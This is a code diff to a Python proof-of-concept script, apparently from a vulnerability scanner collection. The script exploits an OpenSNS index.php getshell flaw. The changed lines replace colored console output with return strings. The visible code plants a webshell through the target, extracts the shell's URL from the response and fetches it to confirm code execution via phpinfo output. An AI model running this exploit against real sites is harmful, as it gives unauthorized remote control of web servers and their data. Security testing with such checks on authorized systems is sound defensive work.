@@ -9,8 +9,8 @@ description: 文件index.php中,参数data base64解码getshell。
 import sys
 import json
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class opensns_index_getshell_BaseVerify:
     def __init__(self, url):
@@ -31,12 +31,12 @@ class opensns_index_getshell_BaseVerify:
             shellurl = req.text[pos::].replace("\\","").strip('"}')
             req2 = requests.get(shellurl, headers=headers, timeout=10, verify=False)
             if r"Configuration File (php.ini) Path" in req2.text:
-                cprint("[+]存在opensns index.php 前台getshell漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)+"\nshell地址: "+shellurl, "red")
+                return "[+]存在opensns index.php 前台getshell漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)+"\nshell地址: "+shellurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = opensns_index_getshell_BaseVerify(sys.argv[1])
     testVuln.run()
